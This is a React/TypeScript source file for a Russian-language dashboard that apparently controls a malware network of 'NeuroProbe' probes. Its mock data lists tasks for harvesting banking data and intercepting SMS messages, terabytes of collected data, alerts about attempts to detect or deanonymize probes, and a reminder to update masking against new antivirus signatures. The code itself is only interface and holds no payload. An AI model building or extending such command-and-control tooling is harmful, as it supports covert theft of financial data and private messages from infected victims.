import React from 'react';
import styled from 'styled-components';

// Типы
interface SystemStats {
  activeZonds: number;
  totalOperations: number;
  successRate: number;
  activeTasks: number;
  dataCollected: string;
  systemUptime: string;
}

interface ZondPreview {
  id: string;
  name: string;
  status: 'active' | 'inactive' | 'error';
  lastSeen: string;
  location: string;
}

interface RecentActivity {
  id: string;
  type: 'connection' | 'task' | 'data' | 'alert';
  description: string;
  timestamp: string;
  severity?: 'low' | 'medium' | 'high' | 'critical';
}

interface AlertInfo {
  id: string;
  message: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  timestamp: string;
  resolved: boolean;
}

// Стили
const Container = styled.div`
  padding: 20px 0;
`;

const PageHeader = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 24px;
`;

const Title = styled.h1`
  font-size: 1.8rem;
  color: ${props => props.theme.text.primary};
`;

const RefreshButton = styled.button`
  padding: 8px 16px;
  border-radius: 4px;
  background-color: transparent;
  border: 1px solid ${props => props.theme.border.primary};
  color: ${props => props.theme.text.primary};
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  
  &:hover {
    background-color: ${props => props.theme.bg.hover};
  }
`;

const StatsGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
  gap: 20px;
  margin-bottom: 30px;
`;

const StatCard = styled.div`
  background-color: ${props => props.theme.bg.secondary};
  border-radius: 8px;
  padding: 20px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
`;

const StatValue = styled.div`
  font-size: 2rem;
  font-weight: 600;
  color: ${props => props.theme.text.primary};
  margin-bottom: 5px;
`;

const StatLabel = styled.div`
  font-size: 0.9rem;
  color: ${props => props.theme.text.secondary};
`;

const DashboardSection = styled.div`
  margin-bottom: 30px;
`;

const SectionHeader = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
`;

const SectionTitle = styled.h2`
  font-size: 1.2rem;
  color: ${props => props.theme.text.primary};
`;

const ViewAllLink = styled.a`
  font-size: 0.9rem;
  color: ${props => props.theme.accent.primary};
  text-decoration: none;
  
  &:hover {
    text-decoration: underline;
  }
`;

const GridLayout = styled.div`
  display: grid;
  grid-template-columns: 2fr 1fr;
  gap: 20px;
  margin-bottom: 30px;
  
  @media (max-width: 1024px) {
    grid-template-columns: 1fr;
  }
`;

const Card = styled.div`
  background-color: ${props => props.theme.bg.secondary};
  border-radius: 8px;
  padding: 20px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
`;

const ZondList = styled.div`
  display: flex;
  flex-direction: column;
  gap: 10px;
`;

const ZondItem = styled.div`
  display: flex;
  align-items: center;
  padding: 10px;
  border-radius: 4px;
  background-color: ${props => props.theme.bg.tertiary};
`;

const StatusIndicator = styled.div<{status: 'active' | 'inactive' | 'error'}>`
  width: 10px;
  height: 10px;
  border-radius: 50%;
  margin-right: 12px;
  background-color: ${props => 
    props.status === 'active' ? props.theme.success :
    props.status === 'error' ? props.theme.danger :
    props.theme.warning
  };
`;

const ZondInfo = styled.div`
  flex: 1;
`;

const ZondName = styled.div`
  font-weight: 500;
  color: ${props => props.theme.text.primary};
  font-size: 0.95rem;
`;

const ZondDetail = styled.div`
  font-size: 0.8rem;
  color: ${props => props.theme.text.secondary};
`;

const ActivityList = styled.div`
  display: flex;
  flex-direction: column;
  gap: 10px;
`;

const ActivityItem = styled.div<{type?: 'connection' | 'task' | 'data' | 'alert'}>`
  padding: 10px;
  border-radius: 4px;
  background-color: ${props => props.theme.bg.tertiary};
  position: relative;
  padding-left: 20px;
  
  &:before {
    content: '';
    position: absolute;
    left: 8px;
    top: 50%;
    transform: translateY(-50%);
    width: 4px;
    height: 4px;
    border-radius: 50%;
    background-color: ${props => 
      props.type === 'alert' ? props.theme.danger :
      props.type === 'task' ? props.theme.accent.primary :
      props.type === 'data' ? props.theme.success :
      props.theme.warning
    };
  }
`;

const ActivityDescription = styled.div`
  font-size: 0.9rem;
  color: ${props => props.theme.text.primary};
  margin-bottom: 4px;
`;

const ActivityTime = styled.div`
  font-size: 0.8rem;
  color: ${props => props.theme.text.secondary};
`;

const AlertsList = styled.div`
  display: flex;
  flex-direction: column;
  gap: 10px;
`;

const AlertItem = styled.div<{severity: 'low' | 'medium' | 'high' | 'critical'}>`
  padding: 12px;
  border-radius: 4px;
  background-color: ${props => 
    props.severity === 'critical' ? 'rgba(239, 68, 68, 0.1)' :
    props.severity === 'high' ? 'rgba(245, 158, 11, 0.1)' :
    props.severity === 'medium' ? 'rgba(59, 130, 246, 0.1)' :
    'rgba(16, 185, 129, 0.1)'
  };
  border-left: 4px solid ${props => 
    props.severity === 'critical' ? props.theme.danger :
    props.severity === 'high' ? props.theme.warning :
    props.severity === 'medium' ? props.theme.accent.primary :
    props.theme.success
  };
`;

const AlertMessage = styled.div`
  font-size: 0.9rem;
  color: ${props => props.theme.text.primary};
  font-weight: 500;
  margin-bottom: 4px;
`;

const AlertMeta = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
`;

const AlertTime = styled.div`
  font-size: 0.8rem;
  color: ${props => props.theme.text.secondary};
`;

const AlertStatus = styled.div<{resolved: boolean}>`
  font-size: 0.8rem;
  color: ${props => props.resolved ? props.theme.success : props.theme.warning};
  font-weight: 500;
`;

const ChartContainer = styled.div`
  height: 300px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: ${props => props.theme.text.secondary};
  font-style: italic;
`;

const DashboardPage: React.FC = () => {
  // Моковые данные 
  const systemStats: SystemStats = {
    activeZonds: 24,
    totalOperations: 1247,
    successRate: 94.3,
    activeTasks: 8,
    dataCollected: '2.7 TB',
    systemUptime: '15d 7h 23m'
  };
  
  const recentZonds: ZondPreview[] = [
    {
      id: 'zond-001',
      name: 'NeuroProbe #1',
      status: 'active',
      lastSeen: '2023-10-15T14:32:11Z',
      location: 'Москва, Россия'
    },
    {
      id: 'zond-008',
      name: 'NeuroProbe #8',
      status: 'active',
      lastSeen: '2023-10-15T14:28:45Z',
      location: 'Санкт-Петербург, Россия'
    },
    {
      id: 'zond-012',
      name: 'NeuroProbe #12',
      status: 'error',
      lastSeen: '2023-10-15T12:15:22Z',
      location: 'Казань, Россия'
    },
    {
      id: 'zond-005',
      name: 'NeuroProbe #5',
      status: 'inactive',
      lastSeen: '2023-10-14T23:45:18Z',
      location: 'Новосибирск, Россия'
    },
    {
      id: 'zond-017',
      name: 'NeuroProbe #17',
      status: 'active',
      lastSeen: '2023-10-15T14:05:37Z',
      location: 'Екатеринбург, Россия'
    }
  ];
  
  const recentActivity: RecentActivity[] = [
    {
      id: 'act-001',
      type: 'connection',
      description: 'Новое подключение зонда NeuroProbe #22',
      timestamp: '2023-10-15T14:40:23Z'
    },
    {
      id: 'act-002',
      type: 'task',
      description: 'Завершена задача "Сбор банковских данных"',
      timestamp: '2023-10-15T14:32:45Z'
    },
    {
      id: 'act-003',
      type: 'data',
      description: 'Получено 2.5 GB данных с зонда NeuroProbe #8',
      timestamp: '2023-10-15T14:28:12Z'
    },
    {
      id: 'act-004',
      type: 'alert',
      description: 'Обнаружена попытка обнаружения зонда NeuroProbe #12',
      timestamp: '2023-10-15T13:55:38Z',
      severity: 'high'
    },
    {
      id: 'act-005',
      type: 'task',
      description: 'Создана новая задача "Перехват SMS сообщений"',
      timestamp: '2023-10-15T13:42:19Z'
    },
    {
      id: 'act-006',
      type: 'connection',
      description: 'Потеряно соединение с зондом NeuroProbe #5',
      timestamp: '2023-10-14T23:45:18Z'
    }
  ];
  
  const systemAlerts: AlertInfo[] = [
    {
      id: 'alert-001',
      message: 'Критическая уязвимость: Обнаружена попытка деанонимизации зонда NeuroProbe #12',
      severity: 'critical',
      timestamp: '2023-10-15T13:55:38Z',
      resolved: false
    },
    {
      id: 'alert-002',
      message: 'Высокая нагрузка на сервер обработки данных (CPU: 92%)',
      severity: 'high',
      timestamp: '2023-10-15T12:30:15Z',
      resolved: true
    },
    {
      id: 'alert-003',
      message: 'Обнаружены новые антивирусные сигнатуры, требуется обновление маскировки',
      severity: 'medium',
      timestamp: '2023-10-15T10:15:22Z',
      resolved: false
    }
  ];
  
  // Функции форматирования
  const formatTime = (isoString: string): string => {
    const date = new Date(isoString);
    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffSec = Math.floor(diffMs / 1000);
    
    if (diffSec < 60) return `${diffSec} сек. назад`;
    if (diffSec < 3600) return `${Math.floor(diffSec / 60)} мин. назад`;
    if (diffSec < 86400) return `${Math.floor(diffSec / 3600)} ч. назад`;
    
    return new Intl.DateTimeFormat('ru-RU', {
      day: '2-digit',
      month: '2-digit',
      hour: '2-digit',
      minute: '2-digit'
    }).format(date);
  };
  
  const handleRefresh = () => {
    console.log('Обновление данных дашборда');
    // Здесь будет логика обновления данных
  };
  
  return (
    <Container>
      <PageHeader>
        <Title>Панель управления</Title>
        <RefreshButton onClick={handleRefresh}>
          🔄 Обновить данные
        </RefreshButton>
      </PageHeader>
      
      {/* Основные метрики */}
      <StatsGrid>
        <StatCard>
          <StatValue>{systemStats.activeZonds}</StatValue>
          <StatLabel>Активные зонды</StatLabel>
        </StatCard>
        <StatCard>
          <StatValue>{systemStats.totalOperations}</StatValue>
          <StatLabel>Всего операций</StatLabel>
        </StatCard>
        <StatCard>
          <StatValue>{systemStats.successRate}%</StatValue>
          <StatLabel>Успешность</StatLabel>
        </StatCard>
        <StatCard>
          <StatValue>{systemStats.activeTasks}</StatValue>
          <StatLabel>Активные задачи</StatLabel>
        </StatCard>
        <StatCard>
          <StatValue>{systemStats.dataCollected}</StatValue>
          <StatLabel>Собрано данных</StatLabel>
        </StatCard>
        <StatCard>
          <StatValue>{systemStats.systemUptime}</StatValue>
          <StatLabel>Время работы</StatLabel>
        </StatCard>
      </StatsGrid>
      
      {/* График активности */}
      <DashboardSection>
        <SectionHeader>
          <SectionTitle>Активность системы</SectionTitle>
          <ViewAllLink href="#">Детальная статистика</ViewAllLink>
        </SectionHeader>
        
        <Card>
          <ChartContainer>
            [График активности системы будет здесь]
          </ChartContainer>
        </Card>
      </DashboardSection>
      
      {/* Двухколоночный макет */}
      <GridLayout>
        {/* Левая колонка */}
        <div>
          {/* Последние активности */}
          <DashboardSection>
            <SectionHeader>
              <SectionTitle>Последние активности</SectionTitle>
              <ViewAllLink href="#">Все активности</ViewAllLink>
            </SectionHeader>
            
            <Card>
              <ActivityList>
                {recentActivity.map(activity => (
                  <ActivityItem key={activity.id} type={activity.type}>
                    <ActivityDescription>{activity.description}</ActivityDescription>
                    <ActivityTime>{formatTime(activity.timestamp)}</ActivityTime>
                  </ActivityItem>
                ))}
              </ActivityList>
            </Card>
          </DashboardSection>
          
          {/* Оповещения */}
          <DashboardSection>
            <SectionHeader>
              <SectionTitle>Системные оповещения</SectionTitle>
              <ViewAllLink href="#">Все оповещения</ViewAllLink>
            </SectionHeader>
            
            <Card>
              <AlertsList>
                {systemAlerts.map(alert => (
                  <AlertItem key={alert.id} severity={alert.severity}>
                    <AlertMessage>{alert.message}</AlertMessage>
                    <AlertMeta>
                      <AlertTime>{formatTime(alert.timestamp)}</AlertTime>
                      <AlertStatus resolved={alert.resolved}>
                        {alert.resolved ? 'Решено' : 'Активно'}
                      </AlertStatus>
                    </AlertMeta>
                  </AlertItem>
                ))}
              </AlertsList>
            </Card>
          </DashboardSection>
        </div>
        
        {/* Правая колонка */}
        <div>
          {/* Активные зонды */}
          <DashboardSection>
            <SectionHeader>
              <SectionTitle>Активные зонды</SectionTitle>
              <ViewAllLink href="#">Все зонды</ViewAllLink>
            </SectionHeader>
            
            <Card>
              <ZondList>
                {recentZonds.map(zond => (
                  <ZondItem key={zond.id}>
                    <StatusIndicator status={zond.status} />
                    <ZondInfo>
                      <ZondName>{zond.name}</ZondName>
                      <ZondDetail>
                        {zond.location} • {formatTime(zond.lastSeen)}
                      </ZondDetail>
                    </ZondInfo>
                  </ZondItem>
                ))}
              </ZondList>
            </Card>
          </DashboardSection>
          
          {/* Карта активности */}
          <DashboardSection>
            <SectionHeader>
              <SectionTitle>Географическая активность</SectionTitle>
              <ViewAllLink href="#">Расширенный вид</ViewAllLink>
            </SectionHeader>
            
            <Card>
              <ChartContainer>
                [Карта расположения зондов будет здесь]
              </ChartContainer>
            </Card>
          </DashboardSection>
        </div>
      </GridLayout>
    </Container>
  );
};

export default DashboardPage; 